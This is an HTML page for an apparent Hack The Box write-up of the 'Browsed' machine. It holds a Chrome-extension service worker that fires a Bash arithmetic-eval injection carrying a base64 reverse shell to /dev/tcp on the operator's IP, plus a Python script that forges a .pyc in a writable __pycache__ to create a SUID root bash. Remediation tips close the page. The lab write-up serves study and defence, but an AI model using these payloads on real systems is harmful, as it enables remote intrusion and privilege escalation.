@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Extension review portal runs uploaded Chrome extensions inside a headless browser that talks to &#x60;localhost&#x60; — abuse that to hit a Flask app with a Bash arithmetic-eval bug (&#x60;arr[$(…)]&#x60;) and land as &#x60;larry&#x60;. Root comes from a &#x60;sudo&#x60;-allowed Python tool whose &#x60;__pycache__&#x60; is mode 777 — drop a poisoned &#x60;.pyc&#x60; and SUID bash.">
+<title>HTB Browsed · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
+</head>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
+    </button>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
+
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-BROWSED</span></span>
+    <span class="wp-crumb-r">ENG#06 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 25.08.18</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-medium">MEDIUM</span>
+            <span class="wp-chip wp-chip-os os-linux">LINUX</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">CHROME</span><span class="wp-chip wp-chip-ghost tag-cycle-1">BASH</span><span class="wp-chip wp-chip-ghost tag-cycle-2">PYCACHE</span>
+            <span class="wp-chip wp-chip-pts">45 PTS</span>
+          </div>
+          <h1 class="wp-title">HTB Browsed<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Extension review portal runs uploaded Chrome extensions inside a headless browser that talks to `localhost` — abuse that to hit a Flask app with a Bash arithmetic-eval bug (`arr[$(…)]`) and land as `larry`. Root comes from a `sudo`-allowed Python tool whose `__pycache__` is mode 777 — drop a poisoned `.pyc` and SUID bash.</p>
+        </div>
+      </div>
+    </div>
+
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>browsed.htb</dd></div>
+        <div><dt>REF</dt><dd>10.129.244.79</dd></div>
+        
+        
+        <div><dt>DURATION</dt><dd>10 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
+
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 5 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ROOT</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">upload portal + internal vhost</div>
+        <div class="kc-tag kc-tag-warn">HTTP</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#source">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">SOURCE</div>
+        <div class="kc-sub">gitea repo to bash -eq bug</div>
+        <div class="kc-tag kc-tag-warn">GITEA</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#foothold">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">FOOTHOLD</div>
+        <div class="kc-sub">malicious chrome extension</div>
+        <div class="kc-tag kc-tag-warn">RCE</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#user">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">USER</div>
+        <div class="kc-sub">shell as larry</div>
+        <div class="kc-tag kc-tag-warn">SHELL</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#root">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">ROOT</div>
+        <div class="kc-sub">pycache poisoning</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
+
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#source" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">SOURCE</span>
+        </a>
+        <a href="#foothold" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">FOOTHOLD</span>
+        </a>
+        <a href="#user" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">USER</span>
+        </a>
+        <a href="#root" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">ROOT</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">Extension review portal + a hidden Gitea vhost.</h2>
+<div class="wp-stage-body"><p>Only SSH and HTTP are up. The web app is an extension review platform — upload a <code>.zip</code>, their bot loads it in a headless Chrome and screenshots the result. The upload page even tells you the command line:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -s http://10.129.244.79/upload.php
+...
+timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
+  --load-extension=&quot;/tmp/extension_&lt;id&gt;&quot; --remote-debugging-port=0 \
+  --disable-extensions-except=&quot;/tmp/extension_&lt;id&gt;&quot; \
+  --enable-logging=stderr --v=1 \
+  http://localhost/ http://browsedinternals.htb</code></pre>
+</div>
+Two target URLs. A throwaway extension that logs `navigator.userAgent` + `window.location` confirms the bot really visits `browsedinternals.htb`. Pin it in `/etc/hosts`:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ echo &quot;10.129.244.79 browsedinternals.htb browsed.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+</div>
+The internal vhost serves <span class="hl-cool">Gitea</span>. The public repo `larry/MarkdownPreview` is the interesting one.</div>
+</section>
+<section class="wp-stage" id="source" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; SOURCE</div>
+<h2 class="wp-stage-title">Flask app on 127.0.0.1:5000 — Bash arithmetic eval.</h2>
+<div class="wp-stage-body"><p>Cloning the repo exposes a Flask helper and the shell script it wraps:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · source review</span></div>
+<pre class="wp-term-body"><code class="language-python"># app.py
+@app.route(&#39;/routines/&lt;rid&gt;&#39;)
+def routines(rid):
+    result = subprocess.run([&quot;./routines.sh&quot;, rid],
+                            capture_output=True, text=True)
+    return f&quot;&lt;pre&gt;{result.stdout}{result.stderr}&lt;/pre&gt;&quot;</code></pre>
+</div>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · routines.sh</span></div>
+<pre class="wp-term-body"><code class="language-bash">if [[ &quot;$1&quot; -eq 0 ]]; then
+    ...
+fi</code></pre>
+</div>
+The trap is `-eq`. Bash arithmetic <span class="hl-warn">evaluates the argument as an expression</span> — not a string compare. Passing `arr[$(id)]` triggers command substitution inside the `[[ ]]` context before the numeric compare even runs.
+
+<p>The Flask app binds <code>127.0.0.1:5000</code> only. That&#39;s the problem the extension sandbox solves for us.</p>
+</div>
+</section>
+<section class="wp-stage" id="foothold" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; FOOTHOLD</div>
+<h2 class="wp-stage-title">Extension service worker hits localhost on our behalf.</h2>
+<div class="wp-stage-body"><p>A tiny extension with a background service worker fires a <code>fetch</code> to the vulnerable route on load:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · extension · background.js</span></div>
+<pre class="wp-term-body"><code class="language-javascript">const lhost = &quot;10.10.16.163&quot;;
+const lport = &quot;443&quot;;
+const cmd = `bash -c &#39;bash -i &gt;&amp; /dev/tcp/${lhost}/${lport} 0&gt;&amp;1&#39;`;
+const b64 = btoa(cmd);
+const payload = `arr[$(echo ${b64} | base64 -d | bash)]`;
+
+<p>fetch(<code>http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}</code>,
+      { mode: &quot;no-cors&quot; });</code></pre></p>
+</div>
+Zip it, upload, listen:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ zip -r pwnext.zip manifest.json background.js
+$ nc -lvnp 443
+connect to [10.10.16.163] from (UNKNOWN) [10.129.244.79] 52994
+larry@browsed:~$ id
+uid=1000(larry) gid=1000(larry)</code></pre>
+</div>
+`user.txt` is right there.
+
+<aside class="wp-callout wp-tip"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># TIP</div><div class="wp-callout-body"><p>The extension bot is the lift — your payload runs in a process that already has routes to internal services nobody else can reach. Always profile what an automation worker can actually talk to.</p>
+</div></aside></div>
+</section>
+<section class="wp-stage" id="user" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; USER</div>
+<h2 class="wp-stage-title">larry&#39;s sudo line names the root-owned tool.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · larry@browsed</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ sudo -l
+User larry may run:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+
+<p>$ ls -la /opt/extensiontool
+-rwxr-xr-x  root root  extension_tool.py
+-rw-r--r--  root root  extension_utils.py
+drwxrwxrwx  root root  <strong>pycache</strong>          ← mode 777</code></pre></p>
+</div>
+`extension_tool.py` imports from `extension_utils`. Python loads bytecode from `__pycache__` when the cache header's `mtime` + size match the source. Write access to the cache directory = write access to what Python actually executes.</div>
+</section>
+<section class="wp-stage" id="root" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; ROOT</div>
+<h2 class="wp-stage-title">Forge a .pyc with matching header — SUID bash.</h2>
+<div class="wp-stage-body"><p>Build a malicious module, compile it, patch the 16-byte Python 3.7+ header to mirror the real <code>extension_utils.py</code>. The payload module drops a SUID copy of <code>bash</code> into <code>/tmp/rootbash</code> when Python imports it:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · larry@browsed · pyc forge</span></div>
+<pre class="wp-term-body"><code class="language-python">import os, struct, py_compile
+
+<p>target = &#39;/opt/extensiontool/extension_utils.py&#39;
+cache  = &#39;/opt/extensiontool/<strong>pycache</strong>/extension_utils.cpython-312.pyc&#39;</p>
+<p>src = (
+    &quot;import subprocess\n&quot;
+    &quot;\n&quot;
+    &quot;def validate_manifest(path):\n&quot;
+    &quot;    return {&#39;version&#39;:&#39;0.0.1&#39;,&#39;manifest_version&#39;:3,&#39;name&#39;:&#39;x&#39;}\n&quot;
+    &quot;\n&quot;
+    &quot;def clean_temp_files(arg):\n&quot;
+    &quot;    subprocess.run([&#39;cp&#39;,&#39;/bin/bash&#39;,&#39;/tmp/rootbash&#39;])\n&quot;
+    &quot;    subprocess.run([&#39;chmod&#39;,&#39;4777&#39;,&#39;/tmp/rootbash&#39;])\n&quot;
+)
+with open(&#39;/tmp/extension_utils.py&#39;,&#39;w&#39;) as f:
+    f.write(src)</p>
+<p>py_compile.compile(&#39;/tmp/extension_utils.py&#39;, cfile=&#39;/tmp/payload.pyc&#39;)
+st = os.stat(target)</p>
+<p>with open(&#39;/tmp/payload.pyc&#39;,&#39;rb&#39;) as f:
+    data = bytearray(f.read())
+struct.pack_into(&#39;&lt;I&#39;, data, 8,  int(st.st_mtime))
+struct.pack_into(&#39;&lt;I&#39;, data, 12, st.st_size)</p>
+<p>with open(cache,&#39;wb&#39;) as f:
+    f.write(data)</code></pre></p>
+</div>
+Trigger it and collect:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · larry@browsed</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ sudo /opt/extensiontool/extension_tool.py --clean
+$ /tmp/rootbash -p
+# id
+uid=1000(larry) gid=1000(larry) euid=0(root)
+# cat /root/root.txt</code></pre>
+</div>
+<span class="hl-ok">Rooted</span>.
+
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># WHY IT WORKED</div><div class="wp-callout-body"><p>Python trusts <code>__pycache__</code> as long as the header&#39;s mtime + size match the source. Those fields are 4-byte little-endian ints at offsets 8 and 12. A writable cache dir is equivalent to writable source, with none of the audit signals of someone editing <code>.py</code> files in <code>/opt/</code>.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-interpreter-writeup.html">
+          <span class="l">&larr; ENG#05</span>
+          <span class="t">HTB INTERPRETER</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 25.08.18</span>
+        <a class="wp-np next" href="htb-garfield-writeup.html">
+          <span class="l">ENG#07 &rarr;</span>
+          <span class="t">HTB GARFIELD</span>
+        </a>
+        
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">curl</span><span class="purp">http</span></div>
+          <div class="wp-loadout-row"><span class="tool">git</span><span class="purp">source</span></div>
+          <div class="wp-loadout-row"><span class="tool">zip</span><span class="purp">package</span></div>
+          <div class="wp-loadout-row"><span class="tool">nc</span><span class="purp">listener</span></div>
+          <div class="wp-loadout-row"><span class="tool">python3.12</span><span class="purp">pyc-forge</span></div>
+        </div>
+      </div>
+
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Never treat localhost as a privacy boundary — sandboxed automation routes trust back in</li>
+          <li>Use &#x60;[[ &quot;$1&quot; -eq 0 ]]&#x60; only on values already validated as numeric (or switch to &#x60;string &#x3D;&#x3D; &quot;0&quot;&#x60;)</li>
+          <li>Remove passwordless &#x60;sudo&#x60; on scripts that import from world-writable paths</li>
+          <li>Chmod &#x60;__pycache__&#x60; directories to 755 at minimum; audit before shipping</li>
+        </ul>
+      </div>
+    </aside>
+
+  </div>
+
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
